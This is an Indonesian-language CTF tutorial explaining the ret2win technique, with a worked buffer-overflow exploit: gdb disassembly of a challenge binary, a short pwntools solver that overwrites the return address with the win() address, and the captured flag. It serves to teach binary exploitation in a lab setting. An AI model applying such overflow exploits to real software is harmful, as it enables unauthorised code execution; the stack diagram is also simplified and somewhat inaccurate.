# Ret2win 

ret2win itu merupakan sebuah plesetan dari kata **return to win** . pada konteks binary eksploitation, kita bisa memanfaatkan kerentanan seperti **buffer overflow**
atau **format string** untuk melakukan teknik Ret2win. jadi ret2win ini sebenarnya apa?

Ret2win mudahnya adalah sebuah teknik dimana penyerang akan memanipulasi **return address** , merubah nilainya menjadi alamat yang diinginkan penyerang , seperti alamat 
fungsi win.

teknik ini umumnya bisa dilakukan dengan memanfaatkan dua kerentanan utama yaitu **buffer overflow dan format string** 


## return address
**return address** adalah suatu lokasi di stack yang menyimpan sebuah alamat memori fungsi lain. biasanya return address lokasinya ada di **rbp+4 atau rbp+8**
kenapa return address menyimpan alamat memori fungsi lain?

jadi gini, sebuah program kan pasti jalan , mulai mengeksekusi instruksi dari baris 1 , lalu baris 2 , baris 3. , nah dalam satu program itu fungsinya ada lumayan
banyak, ga hanya satu,, jadi program harus tahu habis instruksi di fungsi ini dia mau mengeksekusi instruksi di fungsi mana? 

disinilah fungsi asli return address
dipakai. program tinggal melihat value di return address, jika saja valuenya adalah 0x100 , maka setelah fungsi terakhir, program akan mengeksekusi instruksi di fungsi
yang terletak di 0x100.

contoh stack di fungsi main 
```
  +-----------------------------------+
  |  Instruksi 1: printf('hello')     |
  +-----------------------------------+
  |  Instruksi 2: printf('shinobu')   |
  +-----------------------------------+
  |  Instruksi 3: fgets(32,buffer)    |
  +-----------------------------------+
  |  return 0                         |
  |   return address: exit() (0x4)    |
  +-----------------------------------+
```
ini hanya contoh grafik ya,  
nah normalnya ya program akan mulai mengeksekusi tiap instruksi di fungsi main ini hingga semua instruksi habis. saat instruksi habis, dia akan melihat return
address. membaca alamat yang ada disitu (0x4) lalu pergi ke alamat tersebut untuk mulai mengeksekusi instruksi lagi.

terdengar biasa, tapi akan jadi luar biasa jika user (penyerang) berhasil memanipulasi nilai dari return address ini. jika bisa itu artinya kita akan bisa menyuruh
program mengeksekusi fungsi apapun yang ada semau kita iya kan? jawabannya 98% iya.

biasanya orang orang menyebut teknik manipulasi return address ini dengan kata menimpa return address. karena faktanya memang begitu. kita ga benar benar mengganti
value dari return address , tapi kita menimpa return address dengan nilai baru. jika nilai itu valid. value baru dieksekusi.

Kasus ini dalam ctf biasanya adalah sebuah challenge file binary yang memiliki fungsi win() dengan instruksi printflag. namun fungsi itu tidak pernah di 
eksekusi, hanya sekedar ada saja. lalu caranya menyuruh program mengeksekusi win gimana? 

langkah:
- cari alamat dari win()
- cari kerentanan yang bisa dimanfaatkan untuk menimpa return address
- hitung jarak input ke return address
- timpa return address

## praktek pakai chall
Contoh manipulasi return address:
chall : [cylab academy-lupa](../lupa)

coba jalankan dulu file nya :
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(echo-escape1)
└> ./vuln
Welcome to the secure echo service!
Please enter your name: reno
Hello, reno

Thank you for using our service.
```
tidak ada hal menarik, input yang ada juga tidak mengindikasikan adanya kerentanan format string. coba cari info fungsi apa saja yang tersedia. aku pakai gdb 
```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401256  win
0x00000000004012fb  main
```
fungsi yang berhasil di deteksi adalah main , dan win. setelah mendisassemble fungsi main, ternyata fungsi win tidak dipanggil sama sekali.
```
pwndbg> disas main
Dump of assembler code for function main:
   0x00000000004012fb <+0>:     endbr64
   0x00000000004012ff <+4>:     push   rbp
   0x0000000000401300 <+5>:     mov    rbp,rsp
   0x0000000000401303 <+8>:     sub    rsp,0x20

   0x0000000000401333 <+56>:    lea    rax,[rbp-0x20]
   0x0000000000401337 <+60>:    mov    edx,0x80
   0x000000000040133c <+65>:    mov    rsi,rax
   0x000000000040133f <+68>:    mov    edi,0x0
   0x0000000000401344 <+73>:    call   0x401120 <read@plt>

End of assembler dump.
```
kerentanan terdeteksi ada pada fungsi main , kita bisa memanfaatkan fungsi read untuk menimpa return address. pada program ini tidak dilengkapi dengan proteksi PIE
sehingga alamat memori tidak berubah. ini akan mempermudah semuanya.

solver:
```
from pwn import *

padd = b'a'*0x28
p = process('./vuln')
pay = flat(padd,0x00401256)
p.sendline(pay)
p.interactive()
```
result

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(echo-escape1)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/picoctf/echo-escape1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/rotalactf/reno/pwn/picoctf/echo-escape1/vuln': pid 121581
[*] Switching to interactive mode
Welcome to the secure echo service!
Please enter your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x12@
Thank you for using our service.
flag{iwak_temple_flagflagomaga}
```
